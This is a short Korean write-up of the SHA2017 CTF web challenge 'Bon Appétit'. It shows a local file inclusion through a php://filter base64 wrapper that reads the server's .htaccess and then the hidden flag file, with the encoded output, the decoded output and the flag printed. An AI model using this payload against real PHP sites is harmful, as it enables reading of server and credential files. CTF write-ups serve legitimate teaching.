# [2017_SHA2017] \[WEB] Bon Appétit

### 취약점 - LFI

PHP Wrapper를 통해 서버 내부의 파일을 읽어올 수 있습니다.

```
http://bonappetit.stillhackinganyway.nl/?page=php://filter/convert.base64-encode/resource=/var/www/html/.htaccess

PEZpbGVzTWF0Y2ggIlwuKGh0YWNjZXNzfGh0cGFzc3dkfHNxbGl0ZXxkYikkIj4KIE9yZGVyIEFsbG93LERlbnkKIERlbnkgZnJvbSBhbGwKPC9GaWxlc01hdGNoPgoKPEZpbGVzTWF0Y2ggIlwucGhwcyQiPgogT3JkZXIgQWxsb3csRGVueQogQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPgoKPEZpbGVzTWF0Y2ggInN1UDNyX1Mza3IxdF9GbDRHIj4KICBPcmRlciBBbGxvdyxEZW55CiAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CgoKIyBkaXNhYmxlIGRpcmVjdG9yeSBicm93c2luZwpPcHRpb25zIC1JbmRleGVzCgoK

<FilesMatch "\.(htaccess|htpasswd|sqlite|db)$">
 Order Allow,Deny
 Deny from all
</FilesMatch>

<FilesMatch "\.phps$">
 Order Allow,Deny
 Allow from all
</FilesMatch>

<FilesMatch "suP3r_S3kr1t_Fl4G">
  Order Allow,Deny
  Deny from all
</FilesMatch>


# disable directory browsing
Options -Indexes
```



### Exploit

```
http://bonappetit.stillhackinganyway.nl/?page=php://filter/convert.base64-encode/resource=/var/www/html/suP3r_S3kr1t_Fl4G

ZmxhZ3s4MmQ4MTczNDQ1ZWE4NjU5NzRmYzA1NjljNWM3Y2Y3Zn0K

flag{82d8173445ea865974fc0569c5c7cf7f}
```